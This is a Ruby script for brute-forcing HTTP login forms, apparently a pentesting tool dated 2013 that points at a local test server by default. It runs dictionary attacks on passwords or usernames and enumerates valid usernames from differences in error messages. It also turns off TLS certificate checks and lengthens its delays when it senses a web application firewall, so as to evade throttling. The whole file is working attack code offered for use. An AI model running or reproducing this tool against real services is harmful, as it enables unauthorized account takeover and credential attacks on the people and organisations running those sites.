#!/usr/bin/env ruby
# encoding: utf-8

require 'net/http'
require 'uri'
require 'rainbow'
require 'getoptlong'
require 'json'
require 'mechanize'

opts = GetoptLong.new(
  ['--learn', '-l', GetoptLong::REQUIRED_ARGUMENT],
  ['--start-sleep', '-s', GetoptLong::REQUIRED_ARGUMENT], 
  ['--dictionary', '-d', GetoptLong::REQUIRED_ARGUMENT], 
  ['--fuzz-on-username', '-u', GetoptLong::REQUIRED_ARGUMENT],
  ['--fuzz-on-password', '-p', GetoptLong::REQUIRED_ARGUMENT], 
  ['--working-user', '-w', GetoptLong::REQUIRED_ARGUMENT], 
  ['--silent', '-S', GetoptLong::NO_ARGUMENT], 
  ['--verbose', '-V', GetoptLong::NO_ARGUMENT], 
  ['--post', '-P', GetoptLong::REQUIRED_ARGUMENT],

)

VERSION     = "1.2.0"   
DICT_FILE   = "/usr/share/dict/words"
VERBOSE     = false
BASENAME    = File.basename($0)
PID_FILE    = "http_login_bruteforcer.pid"

DEFAULT_URL = "http://localhost:4567/login"
LOGOUT_URL = "http://localhost:4567/logout"

@sleep_time       = 0
@sleep_inc_ratio  = 40
@sleep_inc        = 1
@verbose          = false
@post             = false
success_body  = ""
failure_body  = ""
@i = 0
@codes = {"200"=>0, "404"=>0}
@silent = false
@found = []



trap("INT")   { die('[INTERRUPTED]') }
trap("SYS")  { stats }
trap("USR1")  { inc_sleep }
trap("USR2")  { dec_sleep }
trap("ALRM")  { print_found }
trap("CHLD")  { toggle_silence }

def save_found(user, pass)
  @found << {:username=>user, :password=>pass}
end

def print_found
  warn("no users were compromised") if @found.size == 0
  @found.each do |f|
    ok("user #{f[:username]} compromised with password #{f[:password]}")
  end
end

def remove_pid_file
  File.delete(PID_FILE) if File.exists?(PID_FILE)
end
def save_pid
  f = File.new(PID_FILE, "w") 
  f.write("#{Process.pid}")
  f.close
end
def die(msg)
  # stats
  printf "#{Time.now.strftime("%H:%M:%S")} [!] #{msg}\n".color(:red)
  remove_pid_file
  Kernel.exit(-1)
end
def err(msg)
  printf "#{Time.now.strftime("%H:%M:%S")} [!] #{msg}\n".color(:red)
end

def warn(msg)
  printf "#{Time.now.strftime("%H:%M:%S")} [!] #{msg}\n".color(:yellow)
end

def ok(msg)
  printf "#{Time.now.strftime("%H:%M:%S")} [*] #{msg}\n".color(:green)
end

def log(msg)
  return if @silent
  printf "#{Time.now.strftime("%H:%M:%S")}: #{msg}\n".color(:white)
end

def helo(msg)
  printf "[*] #{msg} at #{Time.now.strftime("%H:%M:%S")}\n".color(:white)
end


def toggle_silence
  @silent = ! @silent
  @verbose = ! @silent

  warn("silenced. Logs are disabled") if @silent
end

def stats
  speed = @i * 1.0/(Time.now - @start)
  printf "#{Time.now.strftime("%H:%M:%S")} [-] requests made: #{@i}/#{@total}\n".color(:yellow)
  printf "#{Time.now.strftime("%H:%M:%S")} [-] requests/s: #{speed}\n".color(:yellow)
  eta = (@total - @i)*1.0 * speed
  printf "#{Time.now.strftime("%H:%M:%S")} [-] ETA: #{Time.at(Time.now + eta).localtime}\n".color(:yellow)
  printf "#{Time.now.strftime("%H:%M:%S")} [-] #{@found.size} account compromized\n".color(:yellow)
  printf "#{Time.now.strftime("%H:%M:%S")} [-] 200 received: #{@codes["200"]}\n".color(:yellow)
  printf "#{Time.now.strftime("%H:%M:%S")} [-] 404 received: #{@codes["404"]}\n".color(:yellow)
  printf "#{Time.now.strftime("%H:%M:%S")} [-] detected waf?: #{has_waf?}\n".color(:yellow)
  printf "#{Time.now.strftime("%H:%M:%S")} [-] sleep time (s): #{@sleep_time}\n".color(:yellow)
  printf "#{Time.now.strftime("%H:%M:%S")} [-] sleep time increased #{@sleep_inc} times\n".color(:yellow)
end

def has_waf?
  return ((@codes["200"] != 0 and @codes["404"] != 0) or @changed_response)
end

def get(url, username, password=nil)
  u = url.sub(/canary_username/, username).sub(/canary_password/, password) unless password.nil?
  u = url.sub(/canary_username/, username) if password.nil?
  begin 
    uri = URI.parse(u)
  rescue Exception => e
    err(e.messge)
    return nil

  end


  http = Net::HTTP.new(uri.host, uri.port)
  http.use_ssl = (uri.scheme == 'https')

  scream  = false
  tries   = 1

  while ! scream
    begin
      return http.get(uri.request_uri, headers)
    rescue Exception => e
      err(e.message)
      5.times do
        inc_sleep
      end
    end
    sleep(@sleep_time)
    tries += 1
    scream = true if tries > 3
  end

  die("target stopped responding")  
end

def post(url, username, password)
  agent = Mechanize.new 
  agent.user_agent_alias = 'Mac Safari'
  agent.agent.http.verify_mode = OpenSSL::SSL::VERIFY_NONE

  username_set = false
  password_set = false

  page = agent.get(url)
  page.forms.each do |form|
    form.fields.each do |field|
      if field.name.downcase == 'username' or field.name.downcase== 'login'
        username_set = true  
        field.value = username 
      end
      if field.name.downcase == 'password' or field.name.downcase== 'pass' or field.name.downcase== 'pwd'
         password_set = true 
         field.value = password
      end
    end
    return agent.submit(form) if username_set and password_set
  end
  return nil
end

def learn_success(url, username, password)
  response = get(url, username, password) unless @post
  response = post(url, username, password) if @post
  @success_body = response.body unless response.nil?
  @success_body = nil if response.nil?
end

def learn_failure(url, username, password)
  response = get(url, username, password) unless @post
  response = post(url, username, password) if @post
  @failure_body = response.body unless response.nil?
  @failure_body = nil if response.nil?
end
def inc_sleep
  @sleep_time = @sleep_time + (@sleep_inc * Math.log(@sleep_inc_ratio * @sleep_inc))
  @sleep_inc += 1
  log("sleep time increased to #{@sleep_time} seconds")
end

def dec_sleep
  @sleep_time = @sleep_time - (@sleep_inc * Math.log(@sleep_inc_ratio * @sleep_inc))
  @sleep_inc -= 1
  @sleep_time = 1 if @sleep_time <= 0 
  @sleep_inc = 1 if @sleep_inc <= 0
  log("sleep time decreased to #{@sleep_time} seconds")
end


helo "#{BASENAME} v#{VERSION} (C) 2013 - paolo@armoredcode.com is starting up"
log "PID - #{Process.pid}"
save_pid
@fuzz_pass = false
@fuzz_user = false
@dictionary = DICT_FILE
@default_password = nil
@default_username = nil
@working_credentials = nil

url = DEFAULT_URL

opts.each do |opt, val|
  case opt
  when '--learn' 
    username = val.split(':')[0]
    password = val.split(':')[1]

    learn_success(url, username, password)
    learn_failure(url, username, "loremispumhopenobodyintheworldwillreallyusethisaspasswordbutifyoudidityourenotthatsmartasyouthing.thesp0nge")

    log("success body: #{@success_body}")
    log("failure body: #{@failure_body}")
    helo "shutting down"
    Kernel.exit(0)
  when '--post'
    @post = true
    @dictionary = "./popular_users_small.txt"
    username = val

    log("existing user #{username} used as canary")

    wrong_pwd   = post(url, username, "caosintheground").body.gsub(username, 'canary_username')
    wrong_creds = post(url, "caostherapy", "caosintheground").body.gsub("caostherapy", "canary_username")

    die("response is the same if the username is good but password wrong or creds are wrong. Can't bruteforce") if wrong_pwd == wrong_creds

    die "can't open #{@dictionary}" unless File.exists?(@dictionary)
    lines = File.readlines(@dictionary)
    log("#{lines.size} words from dictionary loaded")

    found = []

    lines.each do |line|
      @i += 1

      begin
        line = line.chomp.gsub(' ', '-').gsub("à", "a").gsub("è", "e").gsub("é", "e").gsub("ò", "o").gsub("ù", "u")
      rescue Exception => e
        err(e.message)
        line = "# discarded"
      end

      if ! line.start_with?("#")
        sleep(@sleep_time)
        log("awake... probing with: #{line}")


        r= post(url, line, "loremispumhopenobodyintheworldwillreallyusethisaspasswordbutifyoudidityourenotthatsmartasyouthing.4nt4n1")
        found << line if r.body == wrong_pwd.gsub("canary_username", line) and found.find_index(line).nil?
      end

    end
    log("#{found.size} user(s) found")
    if found.size != 0
      found.each do |user|
        ok(user)
      end
    end
    helo "shutting down"
    remove_pid_file
    Kernel.exit(0)
 

  when '--start-sleep'
    @sleep_time = val.to_i
    log("sleep time: #{@sleep_time} seconds")
  when '--fuzz-on-username'
    @fuzz_pass = true
    @default_password = val
    log("fuzzing usernames for password #{@default_password}")
  when '--fuzz-on-password'
    @fuzz_user = true
    @default_username = val
    log("fuzzing passwords for username #{@default_username}")
  when '--working-user'
    @working_credentials = val
    die("malformed working credentials #{val}. Expecting it in username:password format") unless val.split(':').size == 2

    @username = @working_credentials.split(':')[0]
    @password = @working_credentials.split(':')[1]

    log("using #{@username}:#{@password} for learning phase")

  when '--dictionary'
    @dictionary = val
    log("using #{@dictionary} file")
  when '--silent'
    @silent = true
    @verbose = false
    warn("silenced. Logs are disabled")
  when '--verbose'
    @verbose = true
    @silent = false

    
  end

end

die "can't open #{@dictionary}" unless File.exists?(@dictionary)
lines = File.readlines(@dictionary)
log("#{lines.size} words from dictionary loaded")


# puts ARGV.count
# url = ARGV.shift unless ARGV.shift.nil?

log("target: #{url}") 


die("you must choose if you want to fuzz for usernames or passwords") if ! @fuzz_user and ! @fuzz_pass 
                                                                                       

learn_success(url, @username, @password)
learn_failure(url, @username, "loremispumhopenobodyintheworldwillreallyusethisaspasswordbutifyoudidityourenotthatsmartasyouthing.thesp0nge")

log("success body: #{@success_body}")
log("failure body: #{@failure_body}")



@total = lines.size

@changed_response = false

@start = Time.now

lines.each do |line|
  @i += 1

  begin
    line = line.chomp.gsub(' ', '-').gsub("à", "a").gsub("è", "e").gsub("é", "e").gsub("ò", "o").gsub("ù", "u")
  rescue Exception => e
    err(e.message)
    line = "# discarded"
  end

  if ! line.start_with?("#")
    sleep(@sleep_time)
    log("awake... probing with: #{line}")
    response = get(url, @default_username, line) if @fuzz_user
    response = get(url, line, @default_password) if @fuzz_pass

    if ! response.nil?
      if response.body == @success_body
        ok("password found for user #{line}: #{@default_password}") if @fuzz_pass
        ok("password found for user #{@default_username}: #{line}") if @fuzz_user
        save_found(line, @default_password) if @fuzz_pass
        save_found(@default_username, line) if @fuzz_user

        Kernel.exit(0) if @fuzz_user 
      end

      if (response.body != @success_body) and ( response.body != @failure_body ) 
        if (!@changed_response)
          err("target response changed from the ones learnt. Probably a WAF")
          err("received: #{response.body}") if @verbose
          @changed_response=true
        end
        inc_sleep
        log("WAF detected (response change). Sleep incresed to #{@sleep_time}s") 
      end

      @codes[response.code]+=1
    end

  end

end


helo "shutting down"
remove_pid_file
Kernel.exit(0)
